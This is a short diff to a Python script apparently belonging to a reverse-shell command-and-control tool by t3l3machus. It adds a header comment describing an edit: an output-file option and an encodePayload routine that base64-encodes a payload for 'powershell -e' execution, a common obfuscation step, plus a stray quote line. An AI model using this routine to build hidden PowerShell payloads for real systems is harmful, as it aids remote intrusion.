@@ -1,7 +1,24 @@
 #!/bin/python3
 #
 # Author: Panagiotis Chartas (t3l3machus)
-# https://github.com/t3l3machus
+# Edited by Samuel PAGES lines : 
+#       import os 
+#       parser.add_argument("-of","--out-file", action="store", help = "Path of the raw's payload."), def encodePayload(payload):
+#	
+#       enc_payload = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+#	# Check if out file is correct + out the payload here
+#	if args.out_file:
+#		if os.path.isfile(args.out_file):
+#			os.remove(args.out_file)
+#		try:
+#			with open(args.out_file, 'x') as f:
+#				f.write(str(enc_payload))
+#		except FileNotFoundError:
+#			exit_with_msg('Failed to retrieve the file, (check -h for more details)')
+#	print(f'{PLOAD}{enc_payload}{END}')
+"
+#
+# Reference : https://github.com/t3l3machus
 
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import ssl, sys, argparse, base64, readline, uuid, re
